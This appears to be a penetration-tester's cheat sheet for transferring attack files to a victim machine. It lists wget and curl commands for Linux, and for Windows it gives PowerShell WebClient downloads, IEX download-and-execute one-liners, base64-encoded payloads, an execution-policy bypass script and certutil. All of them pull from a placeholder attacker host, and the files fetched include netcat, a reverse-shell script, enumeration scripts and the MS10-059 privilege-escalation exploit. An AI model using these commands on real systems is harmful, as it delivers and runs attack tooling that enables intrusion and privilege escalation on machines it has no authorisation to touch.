# Firstly, we create a web server on our own machine;
```
python3 -m http.Server <port>  
```
## LINUX

#Then we get our file over the webserver;
```
1. wget http://attackerip/file

2. curl http://attackerip/file > file

```  

------------------------------------------------------------------------------------------------------------------------------
  

## WINDOWS

  

### OPTION 1:

 #Then we get our file over the webserver;
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://attackerip/WindowsEnum/WindowsEnum.ps1','C:\Users\Public\Downloads\WindowsEnum.ps1')
```
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile("http://<ip>/nc64.exe", "C:\Users\Cortin\n.exe")
```
  
  
```powershell
powershell.exe IEX (New-Object Net.WebClient).downloadString('http://attackerip/WindowsEnum/WindowsEnum.ps1')
```
  
  
```powershell
1. Powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://<ip>:8000/Sherlock.ps1')"
```
  
  
  
```powershell
1. Ntmon PRTG software

echo "IEX(New-Object net.webClient).downloadString('http://<ip>/rev.ps1')" | iconv -t UTF-16LE | base64 -w0 > b64payload

 
powershell -enc <b64string> to execute
```

### OPTION 2:

  

#We run the following commands on the victim system, respectively;

  
 ```powershell
echo $webclient = New-Object System.Net.WebClient >>wget.ps1

echo $url = "http://attackerip:port/Chimichurri.exe" >>wget.ps1

echo $file = "ms10-059-exploit.exe" >>wget.ps1

echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
``` 


### OPTION 3: Upto winodws 8

  

#Then we get our file over the webserver;
```powershell
certutil -urlcache -split -f "http://attackerip/file.exe"

certutil -urlcache -f "http://<ip>:8000/MS10-059.exe" MS10-059.exe`
```
